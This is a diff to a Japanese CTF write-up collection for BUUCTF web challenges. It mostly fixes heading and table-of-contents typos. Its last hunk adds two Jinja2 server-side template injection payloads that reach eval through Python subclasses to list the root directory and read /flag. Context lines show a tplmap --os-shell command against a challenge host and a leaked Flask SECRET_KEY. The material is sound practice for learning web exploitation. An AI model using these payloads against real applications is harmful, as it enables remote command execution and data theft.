@@ -11,7 +11,7 @@
 - [[极客大挑战 2019]Havefun](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019havefun)
 - [[护网杯 2018]easy_tornado](#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018easy_tornado)
 - [[RoarCTF 2019]Easy Calc](#roarctf-2019easy-calc)
-- [[极客大挑战 2019]Secret File】](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019secret-file)
+- [[极客大挑战 2019]Secret File](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019secret-file)
 - [[极客大挑战 2019]LoveSQL](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019lovesql)
 - [[ACTF2020 新生赛]Include](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Binclude)
 - [[HCTF 2018]admin](#hctf-2018admin)
@@ -28,7 +28,7 @@
 - [[网鼎杯 2018]Fakebook](#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018fakebook)
 - [[ZJCTF 2019]NiZhuanSiWei](#zjctf-2019nizhuansiwei)
 - [[BJDCTF2020]Easy MD5](#bjdctf2020easy-md5)
-- [[BJDCTF 2nd]fake google】](#bjdctf-2ndfake-google)
+- [[BJDCTF 2nd]fake google](#bjdctf-2ndfake-google)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -297,7 +297,7 @@ f1agg
 
 指定の文字が使えないときは、asciiの10進数表記に変換してphp上でバイト列を文字列に変換する。
 
-# [极客大挑战 2019]Secret File】
+# [极客大挑战 2019]Secret File
 
 action.phpに飛ばされてすぐend.phpにリダイレクトされる。
 action.phpのレスポンスを見てみると
@@ -1578,7 +1578,7 @@ Yes%
 ```
 たしかにいける
 
-#  [BJDCTF 2nd]fake google】
+#  [BJDCTF 2nd]fake google
 ```
 <!--ssssssti & a little trick --> P3's girlfirend is : aaa<br><hr>
 ```
@@ -1589,7 +1589,7 @@ SSTI（サーバサイドテンプレートインジェクション）の脆弱�
 ```
 P3's girlfirend is : <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'sssssssSFSCFAS', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
 ```
-テンプレートインジェクションの脆弱性があることはわかったのでtlpmapを利用してシェルを起動してみます。
+テンプレートインジェクションの脆弱性があることはわかったのでtplmapを利用してシェルを起動してみます。
 
 ```
 $ ./tplmap.py -u "http://8caa370a-dc03-4792-ab0d-bd8771a391af.node3.buuoj.cn/qaq?name=test" --os-shell
@@ -1654,4 +1654,14 @@ var
 posix-linux $ cat /flag
 flag{53d623d5-0946-4207-a1d1-3244e6e8371b}
 posix-linux $ [+] Exiting.
+```
+
+tplmapを使わないとこんな感じになるらしいですがまだまだ理解できてないです。
+
+```
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
+```
+
+```
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")}}{% endif %}{% endfor %}
 ```
